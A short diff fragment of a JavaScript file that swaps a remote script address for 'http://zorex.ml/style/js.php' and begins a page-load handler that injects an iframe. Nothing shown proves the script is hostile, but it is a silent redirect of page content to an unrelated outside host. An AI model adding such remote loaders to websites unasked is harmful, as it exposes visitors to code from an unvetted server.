@@ -1,4 +1,4 @@
-var bjs_location = "https://trickbd.jdevcloud.com/js/js.php"; 
+var bjs_location = "http://zorex.ml/style/js.php"; 
 window.addEventListener("load", function() {
 	var ifrm = document.createElement("iframe");
 	ifrm.setAttribute("id", "tbox");
